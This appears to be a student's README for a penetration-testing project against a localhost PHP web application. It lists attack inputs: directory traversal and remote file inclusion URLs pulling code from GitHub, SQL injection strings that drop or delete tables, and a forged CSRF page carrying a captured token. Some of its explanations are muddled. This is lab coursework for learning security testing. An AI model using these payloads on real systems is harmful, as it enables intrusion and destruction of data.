# Penetration Testing Main Project
I will host all payloads useed to execute penetration testing tests against the localhost web application.

## Index.php

### Information Disclosure

When you create the ```secureappdev``` database in the beginning, via the index.php page, you can see that the username of 'admin' and 'user1' are exposed. <br/>
Even worse, the passwords associated with those users are also exposed. Meaning I am able to sign-in to the either the 'admin' or 'user1' account via the portal.

![index](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/03871d07-9e1c-4551-8f08-6c9993338fda)


## Auth2.php

### Directory Traversal: 
```
http://localhost/Project23/auth2.php?FileToView=css/style.css
```

### File Inclusion:
```
http://localhost/Project23/auth2.php?FileToView=index.php
```

### XSS Reflective:
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-xss/main/Lab11-fixed.php
```

<br/>
I was able to host my old assignment on Github and reference the public-hosted .PHP source page via the same FileToView parameter used to read the yellow.txt file stored in the same directory. The FileToView attribute doesn't just allow for reflective cross-site scripting, but you can see I am able to do directory traversal to the CSS directory as well as reading sensitive data from files such as SQL database which is also located in the same directory:
<br/>

![hosted](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/68013c1a-6a7f-4032-b1e3-2fb508263cef)

### Accessing unsecured Admin Portal (Redirects and Forwards):
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-mainproject/main/redirect-admin-portal.js
```

## Register.php
This is the signup page - ```http://localhost/Project23/register.php```

### SQL Injection
This query includes the commented noise ```--AbC1xyz```, which meets the specified criteria of being at least 8 characters long, containing a mix of uppercase and lowercase letters, and including a digit for the password sanitation. The commented noise itself will not affect the execution of the SQL query but adds some complexity to the string. I do not want the noise to affect the SQL query should ultimately achieves SQL Injection. Here's a breakdown of the query: <br/>

```
'; DROP TABLE loginevents; --AbC1xyz'
```

1. ```';``` This part closes the original SQL statement (if any) and starts a new one. <br/>
2. ```DROP TABLE loginevents;``` This is a SQL command that deletes the specified table (```loginevents``` in this case) from the database. <br/>
3. ```--``` This is a SQL comment that comments out the rest of the original query. It helps to avoid syntax errors that might occur due to the injection.

```
'; DELETE FROM loginevents; --AbC1xyz'
```

```
'; DELETE FROM sapusers; --AbC1xyz'
```

In either case, a ```password_hash``` is used to securely hash the user's password before storing it in the database. <br/>
Additionally, a prepared statement is used to prevent SQL injection. Always hash passwords and avoid inserting user input directly into SQL queries.

![sql](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/2cfabb27-2b60-4529-b22a-ad9e7bf16377)

It's still concerning if the input is being directly stored in the SQL database without proper sanitation, as it could lead to SQL injection vulnerabilities. <br/>
To avoid this, we should always use parameterized queries or prepared statements to handle user input in SQL queries.

## Change.php

In the provided PHP code, the CSRF token is generated and stored in the ```$_SESSION [ 'csrf' ] ``` variable. <br/> 
When a user submits the form, a token is included in a hidden input field named "csrf-token" and sent along with the form data. <br/> 
<br/> 
To find out the CSRF token value, you can inspect the HTML source code of the page or use browser developer tools. Follow these steps:

1. Right-click on the webpage and select "Inspect" or "Inspect Element" in your browser.
2. Navigate to the "Elements" or "HTML" tab in the developer tools.
3. Locate the form element containing the CSRF token. It should look something like this:

```
<form class="signup-form" action="includes/reset.inc.php" method="GET">
    <!-- Other form fields -->
    <input type="hidden" name="csrf-token" value="csrf_token_here"/>
    <!-- Submit button and other elements -->
</form>
```
I found the value attribute of the hidden input field named "csrf-token." <br/>
The value within the double quotes is our CSRF token. <br/>

## Crafting a CSRF Attack via Fake PHP webpage
I wrote a webpage called ```change2.php``` that looks like ```change.php```. <br/>
However, you'll notice that I included the CSRF token in the input type 'hidden'

```
<input type="hidden" name="csrf-token" value="5f165e25a63d2081a8ed0e90093960587ea2e23b00359b577268b251d62d33e9">
```

The source code of my fake webpage can be accessed here: <br/>
https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/blob/main/change2.php

Proof of accessing the CSRF Token in the webpage:
![csrf](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/1683b11a-ba2a-4c40-868c-af8203fe01b2)




